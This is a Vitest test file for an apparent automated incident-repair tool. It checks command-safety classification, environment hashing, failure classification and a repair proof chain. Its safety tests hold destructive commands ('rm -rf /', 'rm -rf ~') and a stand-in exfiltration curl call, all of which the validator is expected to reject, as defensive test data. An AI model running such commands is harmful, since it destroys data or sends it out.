/**
 * Halo Trace — Phase 7 Environment Reconstruction & Hermetic Execution Tests
 *
 * Implements Phase 7 Directives (§4, §5, §31, §34, §35, §44, §45, §66, §67, §84, §85, §102):
 * 1. Provenance tracking: OBSERVED vs DERIVED vs INFERRED (§5).
 * 2. 13-Point Capability Matrix calculation (§34).
 * 3. Command Safety Classification & rejection of destructive/network commands (§44).
 * 4. Fake-Test Attack Rejection (§85): Rejects "echo PASS", "true", "exit 0".
 * 5. Environment Snapshot Hash calculation & stale invalidation (§66).
 * 6. Hermetic Workspace Isolation (§45).
 * 7. Correct failure classification for missing database, external outage, missing config (§35, §102).
 */

import { describe, it, expect, afterAll } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { buildInvestigationSnapshot } from "../../investigation-snapshot";
import {
    LocalRepositoryEnvironmentProvider,
    SnapshotReconstructionEnvironmentProvider,
    CompositeExecutionEnvironmentProvider,
    validateExecutionCommand,
} from "../../execution-environment-builder";
import {
    classifyCommandSafety,
    computeEnvironmentSnapshotHash,
    createExecutionContextField,
} from "../../execution-context";
import { buildCompleteVerifiedRepairProofChain } from "../../proof-engine";

describe("Halo Trace — Phase 7 Environment Reconstruction & Safety (§4 - §105)", () => {
    const tempDirsToClean: string[] = [];

    afterAll(() => {
        for (const dir of tempDirsToClean) {
            try {
                fs.rmSync(dir, { recursive: true, force: true });
            } catch {
                // Ignore cleanup error
            }
        }
    });

    // 1. Provenance Tracking (§4, §5)
    it("preserves strict field-level provenance across OBSERVED, DERIVED, INFERRED, UNKNOWN", () => {
        const fieldObserved = createExecutionContextField("/app/repo", "FILESYSTEM", "OBSERVED");
        const fieldDerived = createExecutionContextField("pnpm", "LOCKFILE", "DERIVED");
        const fieldInferred = createExecutionContextField("node", "FILE_EXTENSIONS", "INFERRED");

        expect(fieldObserved.confidence).toBe("OBSERVED");
        expect(fieldDerived.confidence).toBe("DERIVED");
        expect(fieldInferred.confidence).toBe("INFERRED");
        expect(fieldObserved.contentHash).toBeDefined();
        expect(fieldObserved.observedAt).toBeDefined();
    });

    // 2. Command Safety & Rejection of Malicious / Destructive Commands (§44, §70, §73)
    describe("Command Safety Classification (§44)", () => {
        it("classifies safe local tests as LOCAL_TEST", () => {
            expect(classifyCommandSafety("node --test test/suite.js")).toBe("LOCAL_TEST");
            expect(classifyCommandSafety("pnpm test")).toBe("LOCAL_TEST");
            expect(classifyCommandSafety("node test/repro.test.js")).toBe("LOCAL_TEST");
        });

        it("detects destructive commands and rejects them", () => {
            expect(classifyCommandSafety("rm -rf /")).toBe("DESTRUCTIVE");
            expect(classifyCommandSafety("rm -rf ~")).toBe("DESTRUCTIVE");
            const validation = validateExecutionCommand("rm -rf /");
            expect(validation.valid).toBe(false);
            expect(validation.reason).toContain("REJECTED_DESTRUCTIVE_COMMAND");
        });

        it("detects unauthorized network access and rejects it", () => {
            expect(classifyCommandSafety("curl https://malicious-site.com/exfiltrate")).toBe("NETWORK");
            const validation = validateExecutionCommand("curl https://malicious.com");
            expect(validation.valid).toBe(false);
            expect(validation.reason).toContain("REJECTED_UNAUTHORIZED_NETWORK");
        });
    });

    // 3. Fake-Test Attack Rejection (§85)
    describe("Fake-Test Attack Defense (§85)", () => {
        it("rejects 'echo PASS' as fake test output", () => {
            const v = validateExecutionCommand("echo PASS");
            expect(v.valid).toBe(false);
            expect(v.reason).toContain("REJECTED_FAKE_TEST");
        });

        it("rejects 'true' as synthetic passing command", () => {
            const v = validateExecutionCommand("true");
            expect(v.valid).toBe(false);
            expect(v.reason).toContain("REJECTED_FAKE_TEST");
        });

        it("rejects 'exit 0' as fake exit code", () => {
            const v = validateExecutionCommand("exit 0");
            expect(v.valid).toBe(false);
            expect(v.reason).toContain("REJECTED_FAKE_TEST");
        });
    });

    // 4. Environment Snapshot Hashing & Cryptographic Invalidation (§66, §67)
    it("computes deterministic environment snapshot hash and invalidates on changes", () => {
        const baseContext = {
            workspaceRoot: createExecutionContextField("/workspace", "SOURCE", "OBSERVED"),
            repositoryIdentity: createExecutionContextField("repo-1", "SOURCE", "OBSERVED"),
            revision: createExecutionContextField("commit-a", "SOURCE", "OBSERVED"),
            runtimeVersion: createExecutionContextField("v20.10.0", "RUNTIME", "OBSERVED"),
            packageManager: createExecutionContextField("pnpm", "LOCKFILE", "DERIVED"),
        };

        const hash1 = computeEnvironmentSnapshotHash(baseContext);
        const hash2 = computeEnvironmentSnapshotHash(baseContext);
        expect(hash1).toBe(hash2);

        // Mutate revision -> hash must change!
        const modifiedContext = {
            ...baseContext,
            revision: createExecutionContextField("commit-b", "SOURCE", "OBSERVED"),
        };
        const hash3 = computeEnvironmentSnapshotHash(modifiedContext);
        expect(hash3).not.toBe(hash1);
    });

    // 5. Fail-Closed Classification for Missing Dependencies / External Outages (§35, §102, §103)
    describe("Failure Classification for Genuinely Missing Environments (§35, §102)", () => {
        const provider = new SnapshotReconstructionEnvironmentProvider();

        it("classifies external third-party outages as EXTERNAL_SERVICE_UNAVAILABLE", async () => {
            const snapshot = buildInvestigationSnapshot({
                incident: {
                    issueId: "inc-ext-503",
                    title: "ExternalServiceError: 503 Service Unavailable (Stripe API Outage)",
                    firstSeen: new Date(),
                    lastSeen: new Date(),
                    eventCount: 10,
                    environment: "production",
                    service: "billing-svc",
                },
                failure: {
                    exceptionType: "ExternalServiceError",
                    exceptionMessage: "503 Service Unavailable (Stripe API Outage)",
                    stack: "ExternalServiceError: 503 Service Unavailable",
                    frames: [],
                },
                source: {
                    filePath: "src/stripe.ts",
                    lines: [{ lineNumber: 1, content: "export async function charge() {}" }],
                    resolutionStatus: "exact_file",
                },
            });

            const env = await provider.buildEnvironment(snapshot);
            tempDirsToClean.push(env.workspaceDir);

            expect(env.context.reconstructionStatus).toBe("ENVIRONMENT_RECONSTRUCTION_BLOCKED");
            expect(env.context.blockingClassification).toBe("EXTERNAL_SERVICE_UNAVAILABLE");
            expect(env.context.readinessState).toBe("BLOCKED");
            env.cleanup();
        });

        it("classifies database connection pool failures as DATABASE_UNAVAILABLE", async () => {
            const snapshot = buildInvestigationSnapshot({
                incident: {
                    issueId: "inc-db-pool",
                    title: "TimeoutError: Connection pool exhausted (max: 20)",
                    firstSeen: new Date(),
                    lastSeen: new Date(),
                    eventCount: 5,
                    environment: "production",
                    service: "db-svc",
                },
                failure: {
                    exceptionType: "TimeoutError",
                    exceptionMessage: "Connection pool exhausted (max: 20)",
                    stack: "TimeoutError: Connection pool exhausted",
                    frames: [],
                },
                source: {
                    filePath: "src/db.ts",
                    lines: [{ lineNumber: 1, content: "export async function query() {}" }],
                    resolutionStatus: "exact_file",
                },
            });

            const env = await provider.buildEnvironment(snapshot);
            tempDirsToClean.push(env.workspaceDir);

            expect(env.context.reconstructionStatus).toBe("ENVIRONMENT_RECONSTRUCTION_BLOCKED");
            expect(env.context.blockingClassification).toBe("DATABASE_UNAVAILABLE");
            expect(env.context.capabilityMatrix.database).toBe(false);
            env.cleanup();
        });
    });

    // 6. Natural Reproduction & Proof Chain Execution in Reconstructed Hermetic Sandbox (§13, §47)
    it("autonomously reconstructs hermetic environment and completes proof for pure code defects", () => {
        const snapshot = buildInvestigationSnapshot({
            incident: {
                issueId: "inc-null-meta",
                title: "TypeError: Cannot read properties of undefined (reading 'flags')",
                firstSeen: new Date(),
                lastSeen: new Date(),
                eventCount: 3,
                environment: "production",
                service: "meta-service",
            },
            failure: {
                exceptionType: "TypeError",
                exceptionMessage: "Cannot read properties of undefined (reading 'flags')",
                stack: "TypeError: Cannot read properties of undefined (reading 'flags')\nat processMetadata (src/meta.ts:4:20)",
                frames: [],
                sourceLocation: { file: "src/meta.ts", line: 4 },
                executingFunction: "processMetadata",
            },
            source: {
                filePath: "src/meta.ts",
                containingFunction: "processMetadata",
                lines: [
                    { lineNumber: 1, content: "export function processMetadata(record) {" },
                    { lineNumber: 2, content: "    if (!record || typeof record !== 'object') return null;" },
                    { lineNumber: 3, content: "    // Extract metadata flags" },
                    { lineNumber: 4, content: "    return record.metadata.flags.priority;" },
                    { lineNumber: 5, content: "}" },
                ],
                resolutionStatus: "exact_file",
            },
        });

        // Patch: add null-safe navigation / guard
        const changes = [
            {
                id: "c1",
                file: "src/meta.ts",
                filePath: "src/meta.ts",
                symbol: "processMetadata",
                currentCode: "    return record.metadata.flags.priority;",
                proposedCode: "    return record.metadata?.flags?.priority ?? null;",
                explanation: "Safely navigate optional metadata flags property",
            },
        ];

        const { proofChain, gateResult } = buildCompleteVerifiedRepairProofChain({
            snapshot,
            changes,
            candidateId: "cand-phase7-null-meta",
        });

        expect(proofChain.sourceProof?.status).toBe("VERIFIED");
        expect(proofChain.mechanismProof?.status).toBe("VERIFIED");
        expect(proofChain.ownershipProof?.status).toBe("VERIFIED");
        expect(proofChain.baselineProof?.status).toBe("VERIFIED");
        expect(proofChain.patchProof?.status).toBe("VERIFIED");
        expect(proofChain.behaviorProof?.status).toBe("VERIFIED");
        expect(proofChain.invariantProof?.status).toBe("VERIFIED");
        expect(proofChain.regressionProof?.status).toBe("VERIFIED");
        expect(proofChain.counterexampleProof?.status).toBe("VERIFIED");
        expect(proofChain.environmentHash).toBeDefined();
        expect(proofChain.executionId).toBeDefined();

        expect(gateResult.isVerified).toBe(true);
        expect(gateResult.achievedState).toBe("VERIFIED_REPAIR");
    });
});
